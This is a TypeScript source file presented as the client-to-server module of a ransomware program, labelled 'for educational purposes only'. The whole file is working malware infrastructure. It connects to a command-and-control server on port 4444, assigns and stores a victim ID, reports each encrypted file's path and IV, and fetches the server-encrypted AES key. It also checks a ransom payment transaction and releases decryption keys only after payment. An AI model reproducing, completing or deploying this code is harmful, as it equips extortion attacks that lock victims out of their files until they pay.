// Ransomware Client to Server Communication Module
// For educational purposes only

import net from 'net';
import fs from 'fs';
import path from 'path';

// Server configuration
const SERVER_PORT = 4444;
const SERVER_HOST = '127.0.0.1'; // localhost - only for demonstration

// Message types for client-server communication
export enum MessageType {
    INITIALIZE = 'INITIALIZE',
    STORE_IV = 'STORE_IV',
    ENCRYPT_KEY = 'ENCRYPT_KEY',
    DECRYPT_REQUEST = 'DECRYPT_REQUEST',
    PAYMENT_VERIFICATION = 'PAYMENT_VERIFICATION'
}

interface ServerMessage {
    type: string;
    victimId?: string;
    publicKey?: string;
    aesKey?: string; // Base64 encoded
    encryptedAESKey?: string; // Base64 encoded
    privateKey?: string;
    success?: boolean;
    message?: string;
    iv?: string; // Base64 encoded
    filePath?: string;
}

// Client class to handle communication with the C2 server
export class RansomwareClient {
    private socket: net.Socket | null = null;
    private connected = false;
    private reconnecting = false;
    private reconnectAttempts = 0;
    private maxReconnectAttempts = 5;
    
    // Store essential information for reconnection
    private victimId: string | null = null;
    private lastInitTime: number | null = null;
    
    // Local storage file for client information
    private readonly CLIENT_INFO_PATH = './client_connection.json';
    
    // Constructor
    constructor() {
        this.setupSocket();
        this.loadStoredClientInfo();
    }
    
    // Load stored client information if available
    private loadStoredClientInfo(): void {
        try {
            if (fs.existsSync(this.CLIENT_INFO_PATH)) {
                const data = JSON.parse(fs.readFileSync(this.CLIENT_INFO_PATH, 'utf8'));
                this.victimId = data.victimId;
                this.lastInitTime = data.lastInitTime;
                console.log(`[+] Loaded client connection info for victim: ${this.victimId}`);
            }
        } catch (error) {
            console.error(`[-] Failed to load client info: ${error}`);
        }
    }
    
    // Save client information for reconnection
    private saveClientInfo(): void {
        try {
            const data = {
                victimId: this.victimId,
                lastInitTime: this.lastInitTime || Date.now()
            };
            fs.writeFileSync(this.CLIENT_INFO_PATH, JSON.stringify(data));
        } catch (error) {
            console.error(`[-] Failed to save client info: ${error}`);
        }
    }
    
    // Set up socket connection
    private setupSocket(): void {
        this.socket = new net.Socket();
        
        // Handle connection events
        this.socket.on('connect', () => {
            console.log('[+] Connected to C2 server');
            this.connected = true;
            this.reconnecting = false;
            this.reconnectAttempts = 0;
        });
        
        // Handle disconnection
        this.socket.on('close', () => {
            console.log('[-] Connection to C2 server closed');
            this.connected = false;
            
            if (!this.reconnecting && this.reconnectAttempts < this.maxReconnectAttempts) {
                this.reconnect();
            }
        });
        
        // Handle errors
        this.socket.on('error', (err) => {
            console.error('[-] Socket error:', err.message);
            
            if (!this.connected && !this.reconnecting) {
                console.log('[-] Failed to connect to C2 server');
            }
        });
    }
    
    // Connect to the C2 server
    public async connect(): Promise<boolean> {
        return new Promise((resolve) => {
            if (this.connected && this.socket) {
                resolve(true);
                return;
            }
            
            if (!this.socket) {
                this.setupSocket();
            }
            
            // Set up a timeout for connection attempt
            const timeout = setTimeout(() => {
                console.error('[-] Connection attempt timed out');
                resolve(false);
            }, 5000);
            
            // Handle successful connection
            this.socket!.once('connect', () => {
                clearTimeout(timeout);
                resolve(true);
            });
            
            // Handle connection error
            this.socket!.once('error', () => {
                clearTimeout(timeout);
                resolve(false);
            });
            
            // Attempt connection
            try {
                this.socket!.connect(SERVER_PORT, SERVER_HOST);
            } catch (error) {
                console.error('[-] Failed to initiate connection:', error);
                clearTimeout(timeout);
                resolve(false);
            }
        });
    }
    
    // Attempt to reconnect to the server
    private reconnect(): void {
        if (this.reconnecting) return;
        
        this.reconnecting = true;
        this.reconnectAttempts++;
        
        console.log(`[*] Attempting to reconnect (${this.reconnectAttempts}/${this.maxReconnectAttempts})...`);
        
        setTimeout(async () => {
            this.reconnecting = false;
            const success = await this.connect();
            
            if (!success && this.reconnectAttempts < this.maxReconnectAttempts) {
                this.reconnect();
            } else if (!success) {
                console.error('[-] Failed to reconnect after maximum attempts');
            }
        }, 2000 * this.reconnectAttempts); // Exponential backoff
    }
    
    // Send a message to the server and wait for a response
    public async sendMessage(message: ServerMessage): Promise<ServerMessage> {
        if (!this.connected || !this.socket) {
            const connected = await this.connect();
            if (!connected) {
                throw new Error('Cannot send message: not connected to server');
            }
        }
        
        return new Promise((resolve, reject) => {
            // Handle response
            const handleResponse = (data: Buffer) => {
                try {
                    const response = JSON.parse(data.toString()) as ServerMessage;
                    this.socket!.removeListener('data', handleResponse);
                    resolve(response);
                } catch (err) {
                    reject(new Error(`Failed to parse server response: ${err}`));
                }
            };
            
            // Set up response listener
            this.socket!.on('data', handleResponse);
            
            // Send the message
            try {
                this.socket!.write(JSON.stringify(message));
            } catch (error) {
                this.socket!.removeListener('data', handleResponse);
                reject(new Error(`Failed to send message: ${error}`));
            }
            
            // Set a timeout for response
            setTimeout(() => {
                this.socket!.removeListener('data', handleResponse);
                reject(new Error('Server response timeout'));
            }, 10000); // 10 second timeout
        });
    }
      // Initialize ransomware operations with the server
    public async initialize(): Promise<{
        victimId: string;
        aesKey: Buffer;
        publicKey: string;
    }> {
        try {
            // If we already have a victim ID, try to use it for reconnection
            let message: ServerMessage = {
                type: MessageType.INITIALIZE
            };
            
            if (this.victimId) {
                console.log(`[*] Attempting to reconnect as victim: ${this.victimId}`);
                message.victimId = this.victimId;
            }
            
            const response = await this.sendMessage(message);
            
            if (response.type === 'ERROR') {
                throw new Error(`Server error: ${response.message}`);
            }
            
            if (!response.victimId || !response.aesKey || !response.publicKey) {
                throw new Error('Invalid response from server');
            }
            
            // Save the victim ID and timestamp
            this.victimId = response.victimId;
            this.lastInitTime = Date.now();
            this.saveClientInfo();
            
            return {
                victimId: response.victimId,
                aesKey: Buffer.from(response.aesKey, 'base64'),
                publicKey: response.publicKey
            };
        } catch (error) {
            throw new Error(`Initialization failed: ${error}`);
        }
    }
    
    // Store IV for an encrypted file
    public async storeFileIV(
        victimId: string,
        filePath: string, 
        iv: Buffer
    ): Promise<boolean> {
        try {
            const response = await this.sendMessage({
                type: MessageType.STORE_IV,
                victimId,
                filePath,
                iv: iv.toString('base64')
            });
            
            return response.success === true;
        } catch (error) {
            console.error(`[-] Failed to store IV: ${error}`);
            return false;
        }
    }
    
    // Encrypt the AES key with the server's public key
    public async encryptAESKey(victimId: string): Promise<Buffer> {
        try {
            const response = await this.sendMessage({
                type: MessageType.ENCRYPT_KEY,
                victimId
            });
            
            if (!response.encryptedAESKey) {
                throw new Error('No encrypted AES key in response');
            }
            
            return Buffer.from(response.encryptedAESKey, 'base64');
        } catch (error) {
            throw new Error(`Failed to encrypt AES key: ${error}`);
        }
    }
    
    // Verify payment with the server
    public async verifyPayment(
        victimId: string,
        transactionId: string
    ): Promise<boolean> {
        try {
            const response = await this.sendMessage({
                type: MessageType.PAYMENT_VERIFICATION,
                victimId,
                message: transactionId
            });
            
            return response.success === true;
        } catch (error) {
            console.error(`[-] Payment verification failed: ${error}`);
            return false;
        }
    }
    
    // Request decryption keys after payment
    public async requestDecryption(victimId: string): Promise<{
        privateKey: string;
        ivMap: Map<string, Buffer>;
    }> {
        try {
            const response = await this.sendMessage({
                type: MessageType.DECRYPT_REQUEST,
                victimId
            });
            
            if (!response.success) {
                throw new Error(response.message || 'Decryption request failed');
            }
            
            if (!response.privateKey || !response.message) {
                throw new Error('Invalid decryption response');
            }
            
            // Parse the IVs from the message
            const ivMapObject = JSON.parse(response.message);
            const ivMap = new Map<string, Buffer>();
            
            for (const [filePath, ivBase64] of Object.entries(ivMapObject)) {
                ivMap.set(filePath, Buffer.from(ivBase64 as string, 'base64'));
            }
            
            return {
                privateKey: response.privateKey,
                ivMap
            };
        } catch (error) {
            throw new Error(`Failed to request decryption: ${error}`);
        }
    }
    
    // Disconnect from the server
    public disconnect(): void {
        if (this.socket) {
            try {
                this.socket.end();
                this.socket.destroy();
            } catch (error) {
                console.error('[-] Error disconnecting:', error);
            } finally {
                this.socket = null;
                this.connected = false;
            }
        }
    }
}
